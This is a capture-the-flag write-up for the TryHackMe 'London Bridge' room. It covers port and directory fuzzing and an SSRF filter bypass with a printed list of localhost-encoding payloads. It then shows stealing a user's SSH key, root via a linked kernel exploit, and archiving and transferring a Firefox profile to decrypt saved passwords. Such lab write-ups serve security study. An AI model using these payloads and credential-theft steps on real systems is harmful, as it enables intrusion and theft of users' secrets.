# London Bridge

---

Platform: Tryhackme

Difficulty: Medium

Date: 02/07/2025

Status: Rooted

---

Nmap scan:

```bash
┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=3000 10.10.194.61 -oN nmap.full
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-02 08:46 EDT
Nmap scan report for 10.10.194.61
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http    Gunicorn
|_http-title: Explore London
|_http-server-header: gunicorn
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 22: open ssh(newer version, no need to check for exploits)
- Port 8080: http Gunicorn

Port 8080:

![image](https://github.com/user-attachments/assets/e4d60878-9585-4ccd-af4e-232584a667ce)

Nothing on the home page, lets’s explore other directories and brute force other hidden directories too…

/gallery

![image 1](https://github.com/user-attachments/assets/4b705909-f666-4bda-9e0a-9e8130690f12)

It has image upload functionality, I tried to upload webshell here , but it didn’t work. Let’s check source code, if anything of our interest were there.

![image 2](https://github.com/user-attachments/assets/2aea3574-3706-471b-9879-1f4c353f3ae4)


There was a hint we find in source code, that means there may be other directory or whatever where there user can upload images via links too. Let’s fuzz.

### The hidden directory

Looks like we didn’t find all directories, so let’s try once more and now with some different wordlist - `directory-list-lowercase-2.3-medium.txt`

```bash
┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ ffuf -u http://10.10.27.22:8080/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -ic
```

![image 3](https://github.com/user-attachments/assets/f52229e2-fa61-4486-aeb6-a7344d99c586)


Yeah, that’s what we were looking for /dejaview, let’s search for that in browser.

![image 4](https://github.com/user-attachments/assets/4916cd4c-6bb0-4e72-976d-0a68df97e3b9)


Here looks like we can upload image url and it will show that up here in that page, indication for Server site request forgery(SSRF).

So, first let’s try to intercept a uploading request of existing image located at /uploads/04.jpg via burp suite.

![image 5](https://github.com/user-attachments/assets/cd7668b8-0041-4eca-a249-89f6fd4a7700)


Tried if we can search for [localhost](http://localhost) 127.0.0.1 in that image_url parameter but that get no content back. Looks like SSRF does not work for this parameter.

### Parameter and value fuzzing

Revise room’s hint: Check for other parameters that may been left over during the development phase. If one list doesn't work, try another common one.

We have to fuzz for parameters, what are other parameters exist in this page, lets fuzz it.

```bash
┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ ffuf -X POST -u http://10.10.194.61:8080/view_image -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -ic -H 'Content-Type: application/x-www-form-urlencoded' -d 'FUZZ=/uploads/04.jpg' -fw 226 
```

![image 6](https://github.com/user-attachments/assets/55cfa25f-ebbb-423d-88e1-974017173394)


So, www parameter also works there, let’s check that via requesting [localhost](http://localhost) at http://127.0.0.1:8080

![image 7](https://github.com/user-attachments/assets/d0219392-8974-4060-b2e3-06652e2a41ed)

403 fobidden, means parameter is working well but, maybe there were some protection against SSRF, so that we can’t request for [localhost](http://localhost), but there were other ways to bypass this.

[SSRF cheat sheet](https://highon.coffee/blog/ssrf-cheat-sheet/)

Since these payloads are provided for port `80`, but we only know that `8080` is actually a running service, we modify the list and provide it here:

```bash
127.0.0.1:8080
127.0.0.1:443
127.0.0.1:22
127.1:8080
0
0.0.0.0:8080
localhost:8080
[::]:8080/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:8080/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:8080\@127.2.2.2:8080/
127.1.1.1:8080\@@127.2.2.2:8080/
127.1.1.1:8080:\@@127.2.2.2:8080/
127.1.1.1:8080#\@127.2.2.2:8080/
```

Save these payloads in a file named ssrf-localhost-bypass.txt and now it’s time to fuzz that agian.

```bash
┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ ffuf -X POST -u http://10.10.194.61:8080/view_image -w ssrf-localhost-bypass.txt -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://FUZZ' -fw 27
....
localhost#{domain}      [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 159ms]
localhost/?d={domain}   [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 158ms]
127.0.0.1/{domain}      [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 160ms]
.....
2130706433/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 238ms]
{domain}@127.0.0.1      [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 227ms]
127.1:8080              [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 252ms]
```

We found too many which could work , but for now, will use 127.1:8080

Now, we can try to enumerate all the internal ports running via fuzzing again.
```bash
seq 65365 > ports.txt
```

![image 8](https://github.com/user-attachments/assets/eab16dd5-e6c4-4f8d-b68c-aa5b8b8269d8)

Port 80 was running on localhost

![image 9](https://github.com/user-attachments/assets/bcf3170c-711f-48d8-ac2c-e43ed40b6093)

It was a different index page that we found on port 8080.

We have to enumerate it further , means its directories on port 80:

```bash
┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ ffuf -X POST -u http://10.10.247.100:8080/view_image -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt  -H 'Content-Type: application/x-www-form-urlencoded' -d 'www=http://127.1:80/FUZZ' -fw 96
```
![image 10](https://github.com/user-attachments/assets/5c5e08f0-9bd4-44d0-a2e2-17fea46ebea8)

Got so many directories for port 80 , .ssh looks interesting, let’s check it and see if we could able to get user’s id_rsa via this way.

![image 11](https://github.com/user-attachments/assets/09bf92ef-a228-41b4-945e-e02f0bd5ebe5)

![image 12](https://github.com/user-attachments/assets/54dc6d18-0ea7-48fb-97bf-7f1cd36e6b5d)

### Shell as beth

Save that id_rsa key in our kali machine, give it permission 600 and use it to ssh in to user beth’s account.

```bash
┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ echo " <id_rsa-content>" > id_rsa
┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ chmod 600 id_rsa
```
![image 13](https://github.com/user-attachments/assets/26e7ba91-7227-4685-8d35-aeb95799e0f0)

We searched for user.txt in beth’s home directory but didn’t find, so tried to find it in the whole system

```bash
**beth@london:/home$ find / -type f -name 'user.txt' 2>/dev/null
/home/beth/__pycache__/user.txt
beth@london:/home$ cat /home/beth/__pycache__/user.txt
THM{REDACTED}**
```

---

### Shell as root

Using `uname -a`, we output all the necessary information to find a suitable kernel exploit. We have a linux kernel `4.5.0-122` and we are running Ubuntu.

![image 14](https://github.com/user-attachments/assets/2fd896ae-ecb1-4228-9cd8-57bef01ab81e)

Let’s google it and we find a exploit that was suitable for our machine :

[https://github.com/zerozenxlabs/ZDI-24-020/blob/main/exploit.c](https://github.com/zerozenxlabs/ZDI-24-020/blob/main/exploit.c)

![image 15](https://github.com/user-attachments/assets/9a378dcd-2275-4bd7-99ef-ec923b3b2e3a)

That was a code written in c language, so take a look at our target machine, if it had gcc to complile that code and thank god , it had gcc installed.

![image 16](https://github.com/user-attachments/assets/96a9ade0-6240-4f4a-89fe-03dec9d695b4)

We downloaded exploit.c to our kali machine, and then via wget we transfered that exploit.c to our attacker machine

![image 17](https://github.com/user-attachments/assets/b838408f-0fc7-409a-a1e9-735331a469da)

Now, we just have to compile that exploit.c and run it.

![image 18](https://github.com/user-attachments/assets/4e075e6f-710f-4164-b03f-b39f5eb97534)

And we are root now!

```bash
bash-4.4# cd /root
bash-4.4# ls -la
total 52
drwx------  6 root root 4096 Apr 23  2024 .
drwxr-xr-x 23 root root 4096 Apr  7  2024 ..
lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Apr 23  2024 .cache
-rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
-rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
drwx------  3 root root 4096 Apr 23  2024 .gnupg
drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
-rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
-rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
bash-4.4# cat .root.txt
THM{REDACTED}
```

---

### Last question of room: What is the password of charles?

At first , i read /etc/shadow file to look at charles password hash and tried to crack it via john the ripper, but after one eternity later , i found out that that’s not the intended method, we have to do something else to get charles password.

In the home directory of charles, we found a folder named .mozilla, maybe there is a Firefox profile with a few passwords hidden in it. We can find out how to extract these in the following writeup. Essentially, we only need the files `key4.db` and `logins.json`. But for the showcased script to work, we seem to need the whole profile.

[Steal Firefox Passwords from Windows & Linux](https://medium.com/@s12deff/steal-firefox-passwords-from-windows-linux-9d9a87906c7d)

First, we archive the directory and transfer it to our machine.

```bash
bash-4.4# tar -cvzf /tmp/firefox.tar.gz firefox
....
bash-4.4# cd /tmp
bash-4.4# python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...

┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ wget http://10.10.247.100:9001/firefox.tar.gz  
--2025-07-02 10:54:02--  http://10.10.247.100:9001/firefox.tar.gz
Connecting to 10.10.247.100:9001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15135211 (14M) [application/gzip]
Saving to: ‘firefox.tar.gz’

firefox.tar.gz                    100%[============================================================>]  14.43M  1.47MB/s    in 20s     

2025-07-02 10:54:23 (728 KB/s) - ‘firefox.tar.gz’ saved [15135211/15135211]
```

Extracting the archive and fixing the permission issues.

```bash
┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ tar -xvzf firefox.tar.gz

┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ sudo chmod -R 777 firefox
```

Now, using the [`firefox_decrypt`](https://github.com/unode/firefox_decrypt) program to extract the credentials, we obtain the password for the charles user and complete the room.

```bash
┌──(kali㉿kali)-[~/tryhackme/london-bridge]
└─$ python3 firefox_decrypt.py firefox/8k3bf3zp.charles                                                                  
2025-07-02 10:55:07,914 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles
2025-07-02 10:55:07,914 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles' is a profile location

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: 'REDACTED'
```

That’s it , we solved the machine!✅
